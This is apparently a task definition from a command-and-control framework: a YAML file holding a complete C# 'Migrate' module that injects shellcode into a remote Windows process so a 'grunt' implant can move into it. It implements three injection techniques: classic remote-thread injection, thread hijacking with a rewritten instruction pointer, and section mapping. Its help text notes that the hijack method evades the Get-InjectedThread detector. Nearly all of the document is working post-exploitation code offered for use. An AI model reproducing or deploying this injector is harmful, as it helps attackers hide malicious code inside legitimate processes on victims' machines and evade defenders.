- Name: Migrate
  Aliases: []
  Description: Migrate grunt into a running process by injecting Donut-generated shellcode.
  Author: 
      Name: Apr4h
      Handle: _Apr4h
      Link: https://github.com/apr4h
  Help: This task uses one of three different process injection techniques to load shellcode into a remote process and execute it. 
    The Classic technique uses VirtualAlloc -> WriteProcessMemory -> CreateRemoteThread and is the most reliable. 
    

    The ThreadHijack technique is similar, but evades detection from Get-InjectedThread by creating the remote thread with the base 
    address of a loaded DLL function. This technique will only work between processes with the same architecture - e.g. x86 -> x86 or 
    x64 -> x64


    The NtMapViewOfSection technique creates a new memory section in the current process, maps a view of that section in the current and
    target remote processes, writes shellcode to the memory section and finally creates a thread in the target process pointing to the mapped view.
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    public static class Task
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits,
            IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize,
            UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll")]
        public static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize,
            out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint wiun32Protect);

        [DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        // Overloaded to account for different processor architectures
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
        // Overloaded to account for different processor architectures
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint PAGE_EXECUTE_READ = 0x20;


        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public const int CREATE_SUSPENDED = 0x0004;

        public const uint SECTION_QUERY = 0x0001;
        public const uint SECTION_MAP_WRITE = 0x0002;
        public const uint SECTION_MAP_READ = 0x0004;
        public const uint SECTION_MAP_EXECUTE = 0x0008;
        public const uint SECTION_EXTEND_SIZE = 0x0010;
        public const uint SEC_COMMIT = 0x8000000;




        public const int THREAD_TERMINATE = 0x0001;
        public const int THREAD_SUSPEND_RESUME = 0x0002;
        public const int THREAD_GET_CONTEXT = 0x0008;
        public const int THREAD_SET_CONTEXT = 0x0010;
        public const int THREAD_SET_INFORMATION = 0x0020;
        public const int THREAD_QUERY_INFORMATION = 0x0040;
        public const int THREAD_SET_THREAD_TOKEN = 0x0080;
        public const int THREAD_IMPERSONATE = 0x0100;
        public const int THREAD_DIRECT_IMPERSONATION = 0x0200;


        public static string Execute(string processId, string FileContents, string injectMethod)
        {
            try
            {
                byte[] shellcode = Convert.FromBase64String(FileContents);
                string result;
                int pid;
                if (!int.TryParse(processId, out pid))
                {
                    return $"Invalid Process ID: {processId}";
                }
                Process process = Process.GetProcessById(pid);

                IntPtr hProcess = GetProcessHandle(pid);

                if (hProcess == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    if (error == 5)
                    {
                        return "OpenProcess Failed - Access Denied";
                    }
                    else
                    {
                        return $"OpenProcess failed - {Marshal.GetLastWin32Error()}";
                    }
                }
                else
                {
                    if (injectMethod.ToLower() == "ntmapviewofsection")
                    {
                        result = ShellcodeInjectNtMapViewOfSection(shellcode, hProcess);
                    }
                    else if (injectMethod.ToLower() == "classic")
                    {
                        result = ShellcodeInjectClassic(shellcode, hProcess);
                    }
                    else if (injectMethod.ToLower() == "threadhijack")
                    {
                        result = ShellcodeInjectThreadHijack(shellcode, hProcess);
                    }
                    else
                    {
                        return $"InjectMethod {injectMethod} Not supported. Select from: NtMapViewOfSection, Classic, ThreadHijack";
                    }
                }

                if (result == "Success")
                {
                    return result + $" - injected into {process.ProcessName}";
                }
                else
                {
                    return result;
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }

        public static string ShellcodeInjectClassic(byte[] shellcode, IntPtr hProcess)
        {
            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocMemAddress == IntPtr.Zero)
            {
                return "VirtualAlloc - {Marshal.GetLastWin32Error()}";
            }

            UIntPtr bytesWritten;
            WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
            if (bytesWritten == UIntPtr.Zero)
            {
                return "WriteProcessMemory failed - {Marshal.GetLastWin32Error()}";
            }

            if (allocMemAddress == IntPtr.Zero)
            {
                return "VirtualAlloc failed - {Marshal.GetLastWin32Error()}";
            }

            if (CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero) == IntPtr.Zero)
            {
                return $"CreateRemoteThread failed - {Marshal.GetLastWin32Error()}";
            }
            return "Success";
        }


        public static string ShellcodeInjectThreadHijack(byte[] shellcode, IntPtr hProcess)
        {
            string arch;
            bool isTargetWow64;
            IsWow64Process(hProcess, out isTargetWow64);

            if (!isTargetWow64 && IntPtr.Size == 8)
            {
                // Both processes are 64bit
                arch = "x64";
            }
            else if (isTargetWow64 && IntPtr.Size == 4)
            {
                // Both processes are 32bit
                arch = "x86";
            }
            else
            {
                return "Error - Current and target process are not same architecture\nThis technique only works x86 -> x86 or x64 -> x64";
            }

            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Load kernel32.dll and get pointer to the base address of the LoadLibraryA function
            IntPtr fLoadLibrary = GetProcAddress(LoadLibrary("kernel32.dll"), "LoadLibraryA");
            if (fLoadLibrary == IntPtr.Zero)
            {
                return ($"LoadLibrary failed - {Marshal.GetLastWin32Error()}");
            }

            UIntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten))
            {
                return $"WriteProcessMemory failed - {Marshal.GetLastWin32Error()}";
            }

            // Use LoadLibraryA as entrypoint so that memory type is MEM_IMAGE
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, fLoadLibrary, IntPtr.Zero, CREATE_SUSPENDED, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                return $"CreateRemoteThread failed - {Marshal.GetLastWin32Error()}";
            }

            // Check whether both processes are 32/64bit
            if (arch == "x64")
            {
                // Get the current registers for the suspended thread
                CONTEXT64 context = new CONTEXT64();
                context.ContextFlags = CONTEXT_FLAGS.CONTEXT_CONTROL;
                GetThreadContext(hThread, ref context);

                // Update the RIP register to contain the address of the start of the shellcode
                context.Rip = (ulong)allocMemAddress.ToInt64();

                // Update the suspended thread's registers with the changed RIP address then execute the thread
                SetThreadContext(hThread, ref context);
                if (ResumeThread(hThread) == -1)
                {
                    return $"ResumeThread failed - {Marshal.GetLastWin32Error()}";
                }
            }
            else if (arch == "x86")
            {
                // Get the current registers for the suspended thread
                CONTEXT context = new CONTEXT();
                context.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_CONTROL;
                GetThreadContext(hThread, ref context);

                // Update the RIP register to contain the address of the start of the shellcode
                context.Eip = (uint)allocMemAddress.ToInt32();

                // Update the suspended thread's registers with the changed RIP address then execute the thread
                SetThreadContext(hThread, ref context);
                if (ResumeThread(hThread) == -1)
                {
                    return $"ResumeThread failed - {Marshal.GetLastWin32Error()}";
                }
            }
            return "Success";
        }

        public static string ShellcodeInjectNtMapViewOfSection(byte[] shellcode, IntPtr hProcess)
        {
            IntPtr sectionHandle = IntPtr.Zero;
            UInt32 sectionSize = (uint)shellcode.Length;

            // Create a new memory section under the current process
            NtCreateSection(ref sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                IntPtr.Zero, ref sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);

            IntPtr localSectionAddress = IntPtr.Zero;
            uint viewSize = 0;
            ulong sectionOffset = 0;
            NtMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, ref localSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out viewSize, 2, 0, PAGE_READWRITE);

            // Create a view of the memory section in the target process
            IntPtr remoteSectionAddress = IntPtr.Zero;
            NtMapViewOfSection(sectionHandle, hProcess, ref remoteSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out viewSize, 2, 0, PAGE_EXECUTE_READ);

            // Copy shellcode into the newly mapped section of memory
            Marshal.Copy(shellcode, 0, localSectionAddress, shellcode.Length);

            // Execute the shellcode
            IntPtr targetThreadHandle = IntPtr.Zero;
            RtlCreateUserThread(hProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, remoteSectionAddress, IntPtr.Zero, ref targetThreadHandle, IntPtr.Zero);
            if (targetThreadHandle == IntPtr.Zero)
            {
                return $"RtlCreateUserThread Failed - {Marshal.GetLastWin32Error()}";
            }
            return "Success";
        }

        public static IntPtr GetProcessHandle(int processId)
        {
            Process targetProcess = Process.GetProcessById(processId);
            return OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
        }
    }

  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: PID
    Value: ''
    DefaultValue: ''
    Description: Process ID to migrate into.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Donut Shellcode
    Value: ''
    DefaultValue: ''
    Description: 'ShellCodeLauncher file to inject into the remote process'
    SuggestedValues: []
    Optional: false
    DisplayInCommand: false
    FileOption: true
  - Name: Injection Technique
    Value: ''
    DefaultValue: 'ThreadHijack'
    Description: 'Process injection technique to be used for migration'
    SuggestedValues: ['ThreadHijack', 'Classic', 'NtMapViewOfSection']
    Optional: false
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries: []
  ReferenceAssemblies:
  - Name: System.dll
    Location: net40\System.dll
    DotNetVersion: Net40
  - Name: System.Core.dll
    Location: net40\System.Core.dll
    DotNetVersion: Net40
  - Name: mscorlib.dll
    Location: net40\mscorlib.dll
    DotNetVersion: Net40
  - Name: mscorlib.dll
    Location: net35\mscorlib.dll
    DotNetVersion: Net35
  - Name: System.Core.dll
    Location: net35\System.Core.dll
    DotNetVersion: Net35
  - Name: System.dll
    Location: net35\System.dll
    DotNetVersion: Net35
  EmbeddedResources: []